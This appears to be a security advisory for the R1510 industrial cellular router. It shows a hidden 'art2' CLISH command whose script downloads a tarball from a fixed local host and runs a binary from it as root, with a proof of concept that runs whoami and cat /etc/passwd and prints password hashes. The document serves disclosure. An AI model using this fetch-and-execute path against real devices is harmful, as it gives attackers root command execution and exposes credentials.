### Details

The R1510 is an industrial cellular router. It offers several advanced software like an innovative use of Open VPN, Cloud management, data over-use guard, smart reboot and others.

The R1510 has enabled the SSH service. But, instead of providing a linux shell it prompt a CLISH shell. This shell allow to express, through XML configuration files, different type of commands.

Here it is the prompt after login as admin:

```
ssh admin@192.168.0.1
(admin@192.168.0.1) Password:
#

#

```

An hidden command exist in this menu that is called `art2`:

```
# art2
String  Version of art2
#

```

When called the following shell script is executed:

```
#!/bin/sh
#build temporary directory

if [ $# -lt 1 ]; then
    echo "Usage : $0 <Version>"
    exit 1;
fi

VER=$1
DIR=/tmp/art2
if [ ! -d ${DIR} ]; then
        mkdir ${DIR}
fi
cd ${DIR}

#download art.ko and nart.out

rm -rf *

wget http://192.168.0.10/r1510ArtFile.tar.gz

tar -xzvf r1510ArtFile.tar.gz

#change mode of art.ko and nart.out, add execute ability.
chmod 755 r1510-art-factory-${VER}.ko r1510-nart-factory-${VER}.bin

[...]

#start art application
./r1510-nart-factory-${VER}.bin -console

```

This script will download the file `r1510ArtFile.tar.gz` from the host with address `192.168.0.10`. Then it will unpack the file and eventually execute the file `r1510-nart-factory-${VER}.bin` contained in it. This can lead to arbitrary command execution.

### Exploit Proof of Concept

Following the execution of `art2` with `0` as argument.

```
# art2 0
# Connecting to 192.168.0.10 (192.168.0.10:80)
r1510ArtFile.tar.gz  100% |***************************************|   171   0:00:00 ETA
r1510-nart-factory-0.bin
[...]
root
root:$1$ciDDcCQI$ksDdbx2gX84EQfRCUxKGA/:10933:0:99999:7:::
admin:$1$0Y1zMICY$2676GjK83hpbydoXDggR8/:16506:0:99999:7:::
bin:*:10933:0:99999:7:::

adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
[...]

```

Inside the `r1510-nart-factory-0.bin` there are two commands, `whoami` and `cat /etc/passwd`.
